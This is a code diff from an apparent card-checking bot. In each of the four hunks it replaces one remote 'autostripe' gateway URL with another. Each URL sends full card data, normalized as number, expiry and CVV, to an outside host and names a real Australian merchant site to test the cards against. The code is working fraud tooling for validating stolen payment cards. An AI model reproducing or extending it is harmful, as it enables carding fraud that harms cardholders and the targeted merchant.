@@ -1446,7 +1446,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         country_flag = bin_details.get("country_emoji", "")
 
         # Your main API call
-        api_url = f"https://kalinuxx.onrender.com/gateway=autostripe?key=k4linuxx&card={cc_normalized}"
+        api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
         
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=45) as resp:
@@ -1741,7 +1741,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 parts[2] = parts[2][-2:]
             cc_normalized = "|".join(parts)
 
-            api_url = f"https://kalinuxx.onrender.com/gateway=autostripe?key=k4linuxx&card={cc_normalized}"
+            api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
 
             try:
                 async with session.get(api_url, timeout=45) as resp:
@@ -2089,7 +2089,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             nonlocal error_count
             async with semaphore:
                 # The API URL is a placeholder.
-                api_url = f"https://kalinuxx.onrender.com/gateway=autostripe?key=k4linuxx&card={card}"
+                api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={card}"
                 try:
                     async with session.get(api_url, timeout=45) as resp:
                         data = await resp.json()
@@ -2519,7 +2519,7 @@ async def background_check_multi(update, context, cards, processing_msg):
     async def check_card(session, card):
         try:
             async with session.get(
-                f"https://kalinuxx.onrender.com/gateway=autostripe?key=k4linuxx&card={card}",
+                f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={card}",
                 timeout=45
             ) as resp:
                 text_data = await resp.text()
